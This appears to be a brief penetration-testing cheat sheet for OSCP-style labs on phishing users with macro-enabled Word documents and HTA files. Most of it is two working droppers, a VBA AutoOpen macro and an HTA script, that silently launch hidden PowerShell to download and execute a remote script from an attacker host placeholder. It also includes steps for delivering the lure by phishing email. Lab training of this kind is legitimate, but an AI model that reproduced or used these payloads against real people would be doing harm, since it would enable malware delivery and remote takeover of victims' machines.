# 06.02 Office Macros HTA Word

> Drop a PowerShell download-and-run into a macro-enabled `.doc` or HTA and phish the simulated user.

## Overview

Even outside OSEP, the OSCP labs include simple client-side phishing scenarios. Build a macro-enabled doc with a basic PowerShell download-and-run; deliver to the simulated user.

## Steps

- **Generate payload** — msfvenom or PowerShell one-liner.
- **Embed in Document_Open / AutoOpen** — auto-fires on enable.
- **Lure click** — phish e-mail or visible link.

## Commands

### Minimal Word VBA

```vba
Sub AutoOpen()
  Shell "powershell -nop -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/r.ps1')"""
End Sub
```

### HTA dropper

```html
<html><head><script language='VBScript'>
Set o = CreateObject("WScript.Shell")
o.Run "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/r.ps1')"
Self.Close
</script></head></html>
```
